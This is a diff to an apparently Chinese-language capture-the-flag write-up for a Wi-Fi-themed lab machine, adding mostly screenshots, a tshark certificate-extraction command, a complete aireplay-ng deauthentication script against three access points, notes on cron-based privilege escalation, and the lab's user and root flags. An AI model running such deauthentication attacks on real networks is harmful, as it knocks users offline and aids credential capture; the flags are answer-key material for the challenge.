@@ -269,8 +269,133 @@ int __fastcall main(int argc, const char **argv, const char **envp)
 >当然我想过了uid的绕过但是我感觉应该是成功不了的，到这里目前看的bug貌似修复了很多，但是感觉还是存在，但是我对于wifi这个玩意真不熟测试uid之后就搁置了
 >
 
+>找了一下找到2个常规解到wp，其中一个是作者的话不多说直接照搬把它打完，原理的话就是bug部分加一小段就是如何获取tom这个用户，剩下都一样
+>
+
+![picture 17](../assets/images/c3b9c43abb509ef3fd512e2707bfb5f632aa9a664d3ae888717568cf184e7fe1.png)  
+
+>开了很多网络服务首先我们可以先把其他服务给关了
+>
+
+![picture 18](../assets/images/a50a835dd7e12a81c20c1d137e1c94f35b38752700ef7a008529a72a17e92a6b.png) 
+![picture 20](../assets/images/4fa5766185cecd917fd7e7c0c05a52b862685eae771d45170485767c96176378.png)  
+
+![picture 19](../assets/images/a8dded8fa91189d12bfd2f4f7fa23a1029cd99fd66255924fef29378293e5f90.png)  
+
+![picture 21](../assets/images/1e776f44a0df6425ef33b0fb9f0cf42c2a2148d744a00359cb2712c61c109259.png)  
+![picture 22](../assets/images/1b23edf6b2694bbb18fc7b22b5141c40397ead4b4c48ef33c4e377df838a57e0.png)  
+
+![picture 23](../assets/images/87a0ae7355ec3c273429e9d056cc703c8234820bdb32fe9a03ce86b389388cbf.png)  
+
+
+```
+tshark -r scan-01.cap -Y "ssl.handshake.type == 11" -V | grep -ow -E '(countryName=\\w+)|(stateOrProvinceName=.+)|(localityName=.+)|(organizationName=.+)|(emailAddress=.+)|(commonName=.+)' | cut -d ',' -f 1 | sed 's/)//' | sort -u
+```
+
+![picture 24](../assets/images/fedbb268d9dcd4f0dd6d08ada72cae0879a203aee3f776a09dc689b8d53fd9a8.png)  
+![picture 25](../assets/images/255cb7a25fa3332471eff6f25d10f046480f3ed6dfbc6f3c35c4452490aaa01a.png)  
+
+```
+harry_potter@MagiFi:/tmp/attacks$ nano deauth.sh
+harry_potter@MagiFi:/tmp/attacks$ cat deauth.sh 
+#!/bin/bash
+
+wlan1="wlan3"
+wlan2="wlan4"
+wlan3="wlan5"
+
+bssid1Channel="44"
+bssid2Channel="36"
+bssid3Channel="40"
+
+bssid1="F0:9F:C2:71:22:15"
+bssid2="F0:9F:C2:71:22:16"
+bssid3="F0:9F:C2:71:22:17"
+
+check_monitor_mode() {
+  interface=$1
+  channel=$2
+  mode=$(iwconfig ${interface}mon 2>/dev/null | grep "Mode:Monitor")
+  if [ -z "$mode" ]; then
+    sudo airmon-ng start $interface $channel
+  fi
+}
+
+run_aireplay() {
+  interface=$1
+  bssid=$2
+  sudo aireplay-ng -0 30 -a $bssid ${interface}mon
+}
+
+check_monitor_mode $wlan1 $bssid1Channel
+check_monitor_mode $wlan2 $bssid2Channel
+check_monitor_mode $wlan3 $bssid3Channel
+
+echo "Running deauthentication attack..."
+
+run_aireplay $wlan1 $bssid1 &
+run_aireplay $wlan2 $bssid2 &
+run_aireplay $wlan3 $bssid3 &
+
+wait
+```
+
+
+>完了运行脚步有hash值出来但是我没有无语，不过呢我看明白了，整得我是乱七八糟，不管了既然就单纯爆破的情况下我直接密码爆破好了找啥hash值
+>
+
+![picture 26](../assets/images/2b6d4a8a845a6efd7c092a802c09232967d46068e83320a35144172dcaf8be18.png)  
+
+>当然我知道密码是什么但是我想爆破完整需要多少分钟
+>
+
+![picture 27](../assets/images/ac98ddc9145c7a4867728f08ec7f6a97d9fb66160bd759a984a25b35d4925d3b.png)  
+
+>太多了自动kill了，真离谱，算了我跳过这一步，想了解的还是去看DING Tom的视频和作者的wp吧
+>
+
+![picture 28](../assets/images/c762336bf04ce74f1cdeb44e81f1dd6dbf1451dd2c7873779be8633819de014f.png)  
+
+>之前反编译过程序当是这个用户就可以控制xxd了
+>
+
+![picture 29](../assets/images/80ab81b62536a8bd6f5201b7a038d036ebf39d0bac82fd16c4223ef2c3265e76.png)  
+
+>还有个定时任务在弄这个东西
+>
+
+![picture 30](../assets/images/0f702733ab20a34f884214c53e3931d8dba741ed2d0dae46404afc32aac4f04b.png)  
+
+![picture 31](../assets/images/add3e505a5d3ca33c029ec41807c617d1bd7601c5bb57ab78d7e6b73db61e83a.png)  
+
+>好像做了目录特殊问题
+>
+
+![picture 32](../assets/images/0ce8e707f42f1e7900cc83fc2dd1b9c383b5299b171dcc4eec0b98990e7897bc.png)  
+
+![picture 33](../assets/images/61b6bdcd07407a2088a6a59fbc077976075b574122d7a5bbc6d63655a72cd318.png)  
+
+>这是标准解
+>
+
+![picture 34](../assets/images/706fe9f1deae4e1e2929398f01a9caf61bb3127da9c8cb9f86df96ba38034565.png)  
+
+>这里我们继续看一下反编译
+>
+
+![picture 35](../assets/images/f5f74710c5c208d07e662c37fce675b0ae21bd08ec830318e1c2a115d28c61f9.png)  
+
+>笑死还是能读换个名字罢了我以为把这个bug修了,不管也算预防直接获取wp
+>
+
+![picture 36](../assets/images/575779c543f54d5c06a7018c11f0141197a6fb57d14c14cc49b91b7ed9c40fbd.png)  
+
+>反编译完还挺简单的就是一个命令执行但是他得是elf才能执行，原来定时任务的是一个png，所以需要换头执行，ok结束了，没有完成的地方再搁置一段时间因为我还没找到解决方案
+>
+
+
 
 >userflag:hogwarts{ea4bc74f09fb69771165e57b1b215de9}
 >
->rootflag:
+>rootflag:hogwarts{5ed0818c0181fe97f744d7b1b51dd9c7}
 >
